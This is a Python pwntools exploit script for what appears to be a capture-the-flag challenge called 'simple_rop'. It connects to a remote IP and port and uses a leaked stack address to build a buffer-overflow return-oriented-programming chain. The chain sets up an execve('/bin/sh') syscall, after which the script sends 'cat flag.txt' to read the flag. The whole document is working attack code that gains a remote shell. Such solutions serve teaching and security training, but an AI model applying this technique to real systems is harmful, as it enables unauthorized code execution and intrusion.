from pwn import *

p = remote('140.113.207.245', 30173)
# p = process('./simple_rop/simple_rop')

p.recvuntil(b'here is your stack address ')


stack_addr = int(p.recvline().decode('ascii'), 16)
# print(stack_addr)

pop_rdi_rbp = 0x402188
pop_rsi = 0x4104c2
pop_rdx = 0x413270
pop_rax = 0x427f2b
syscall = 0x401324

offset = 24  # buffer + saved rbp

gadget_chain_len = 10 * 8  # 10個gadget+value, 每個p64是8bytes
bin_sh_addr = stack_addr + offset + gadget_chain_len

payload = b'A' * 16
payload += b'B' * 8
payload += p64(0x402188)
payload += p64(bin_sh_addr)
payload += p64(0xdeadbeef)  # rbp亂塞
payload += p64(0x4104c2)
payload += p64(0x0)
payload += p64(0x413270)
payload += p64(0x0)
payload += p64(0x427f2b)
payload += p64(59)
payload += p64(0x401324)
payload += b'/bin/sh\x00'

p.send(payload)
p.sendline(b'cat flag.txt')
flag = p.recvuntil(b'}')
print(flag.decode())
